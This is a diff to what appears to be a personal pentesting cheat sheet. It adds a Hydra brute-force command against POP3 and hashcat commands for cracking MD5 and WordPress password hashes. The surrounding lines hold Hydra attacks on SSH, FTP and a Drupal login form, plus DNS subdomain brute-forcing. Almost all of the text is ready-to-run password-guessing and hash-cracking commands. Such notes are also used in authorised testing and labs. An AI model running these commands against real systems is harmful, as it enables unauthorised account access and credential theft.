@@ -19,6 +19,9 @@ hydra -t 4 -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -s 500
   ## Bruteforce FTP
 hydra -t 4 -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/cristi-passwords.txt 192.168.13.236 ftp
 
+#Bruteforce POP3
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.158 pop3
+
   ## DNS bruteforce
 nmap -p 80 --script dns-brute.nse domain.com 
 python dnscan.py -d domain.com -w ./subdomains-10000.txt
@@ -69,3 +72,9 @@ site="192.168.230.147"
 id=$(curl -s http://$site/user/|grep "form_build_id" |cut -d"\"" -f6)
 hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt $site http-form-post "/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry" -V
 
+#crack MD5 with hashcat and wordlist. a=0 is straight attack
+oclHashcat64.exe -m 0 -a 0 C:\Users\Cristi\Downloads\hashuri.txt F:\wordlist\realuniq.lst
+oclHashcat64.exe -m 0 -pw-max=8 C:\Users\Cristi\Downloads\hashuri.txt F:\wordlist\realuniq.lst
+
+#Brute force Wordpress (PHPASS)
+cudahashcat64.exe -m 400 -a 3 hashfile wordlist
